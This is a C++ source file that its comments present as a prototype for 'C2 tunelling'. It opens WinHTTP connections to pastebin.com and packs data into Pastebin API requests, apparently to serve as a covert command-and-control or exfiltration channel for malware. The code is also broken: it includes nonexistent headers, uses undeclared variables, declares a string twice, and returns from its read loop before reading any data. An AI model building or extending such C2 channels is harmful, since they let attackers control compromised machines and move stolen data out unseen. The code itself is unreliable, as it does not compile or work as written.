//  implementation to implement C2 tunelling
//here is prototype using WinHTTP

// source : https://learn.microsoft.com/en-us/windows/win32/winhttp/about-winhttp

//using WinHTTP API to access a web API

// HANDLE  HINTERNET // called when interacting with an HTTP server

// initalizing winHTTP

#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string>

#pragma comment(lib, "winhttp.lib")


// Function to create JSON string for Pastebin API
#include <wrl.h>
#include <wrl/wrappers/corewrappers.h>
#include <windows.data.json.h>
#include <string>
#include <wstring>
#include <hstring.idl>

// Function to create JSON string for Pastebin API
std::wstring CreatePastebinJSON(const wchar_t* apiKey, const wchar_t* pasteData) {
	Microsoft::WRL::ComPtr<Windows::Data::Json::JsonObject> jsonObject;

	// Create and populate JSON object
	if (Windows::Data::Json::JsonObject::TryParse(L"{}").CopyTo(jsonObject.GetAddressOf())) {
		jsonObject->Insert(L"api_dev_key", Windows::Data::Json::JsonValue::CreateString(apiKey));
		jsonObject->Insert(L"api_option", Windows::Data::Json::JsonValue::CreateString(L"paste"));
		jsonObject->Insert(L"api_paste_code", Windows::Data::Json::JsonValue::CreateString(pasteData));
	}
	else {
		// Handle the error while creating JSON object
		return L""; // Return empty string on failure
	}

	// Convert JSON object to string
	std::string jsonString;
	jsonObject->ToString(jsonString);

	return std::wstring(jsonString.c_str()); // Return as std::wstring
}

bool leftover(bool ret, DWORD size, DWORD downloaded, LPSTR buffer, HINTERNET net_handle);

bool stub_estalish_comms() {
	//bool result
	bool unary_res = false;

	// buffer elements
	DWORD dw_sz = 0;
	DWORD dw_downnloaded = 0;
	LPSTR lp_out_buf;

	HINTERNET	hSession = NULL,
				hConnect = NULL,
				hRequest = NULL;
	// obtain a session handle
	hSession = WinHttpOpen (L" WinHTTP comms test",
							WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
							WINHTTP_NO_PROXY_NAME,
							WINHTTP_NO_PROXY_BYPASS, 0);

	// Connect to the server
	hConnect = WinHttpConnect(hSession, L"pastebin.com", INTERNET_DEFAULT_HTTP_PORT, 0);
	if (!hConnect) {
		printf("WinHttpConnect failed: %d\n", GetLastError());
		WinHttpCloseHandle(hSession);
		return;
	}

	// Create JSON string for Pastebin
	std::wstring jsonString = CreatePastebinJSON(apiKey, pasteData); // setup keys
	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE);
	//JSON part to forward to pastebin
	std::wstring jsonString = CreatePastebinJSON(apiKey, pasteData);

	// Ensure jsonString is not empty before sending
	if (jsonString.empty()) {
		printf("Failed to create JSON string.\n");
		return;
	}
	// End the request.
	if (unary_res)
		unary_res = WinHttpReceiveResponse(hRequest, NULL);

	// cleanup
	bool cleanup = leftover(unary_res, dw_sz, dw_downnloaded, lp_out_buf, hSession);

	// Clean up
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
}

bool leftover(bool ret, DWORD size, DWORD downloaded, LPSTR buffer, HINTERNET net_handle) {
	// Keep checking for data until there is nothing left.
	if (ret)
		do
		{
			// Check for available data.
			size = 0;
			if (!WinHttpQueryDataAvailable(net_handle, &size))
				printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
			return false;

			// Allocate space for the buffer.
			buffer = new char[size + 1];
			if (!buffer)
			{
				printf("Out of memory\n");
				size = 0;
			}
			else
			{
				// Read the Data.
				ZeroMemory(pszOutBuffer, dwSize + 1);

				if (!WinHttpReadData(net_handle, (LPVOID)buffer,
					dwSize, &downloaded))
					printf("Error %u in WinHttpReadData.\n", GetLastError());
				else
					printf("%s\n", pszOutBuffer);

				// Free the memory allocated to the buffer.
				delete[] pszOutBuffer;

				return false;
			}

		} while (size > 0);
	return true;
}